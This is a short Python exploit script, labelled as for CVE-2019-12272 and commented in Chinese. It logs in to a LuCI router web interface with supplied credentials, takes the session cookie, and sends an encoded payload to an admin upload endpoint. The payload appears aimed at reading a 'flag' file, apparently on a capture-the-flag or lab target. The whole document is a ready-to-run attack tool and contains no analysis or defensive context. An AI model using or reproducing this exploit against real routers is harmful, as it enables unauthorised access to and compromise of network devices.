import subprocess
import requests
import argparse

def exploit(args):

        address = args.address
        username = args.username
        password = args.password
        # 获取 cookie 
        session = requests.Session()
        url = 'http://%s/cgi-bin/luci/' % address
        data = {'luci_username':username,'luci_password':password}
        response = session.post(url=url,data=data,verify=False)
        auth = response.request.headers['Cookie'].split('=')
        cookies = {auth[0]:auth[1]}
        # 示例用法
        lua_file = "serialize.lua"

        # code=run_lua_file(lua_file)
        code="eyJhIjp7Im1lc3NhZ2UiOiJwYXlsb2FkIiwiY29kZSI6MX0sImZpbGUiOiJcXGZcXGxcXGFcXGciLCJiIjp7Im1lc3NhZ2UiOiJwYXlsb2FkIiwiY29kZSI6Mn19"
        print(code)
        url = f"http://{address}/cgi-bin/luci/admin/upload/upload/date/{code}" 
        response = session.get(url)
        print(response.text)
def main():
    parser = argparse.ArgumentParser(description='cve-2019-12272.py')
    requiredNamed = parser.add_argument_group('required named arguments')
    requiredNamed.add_argument('-a', '--address', help='Luci host address', required=True)
    requiredNamed.add_argument('-u', '--username', help='Luci username', required=True)
    requiredNamed.add_argument('-p', '--password', help='Luci password', required=True)
    args = parser.parse_args()
    exploit(args)
if __name__== "__main__":
    main()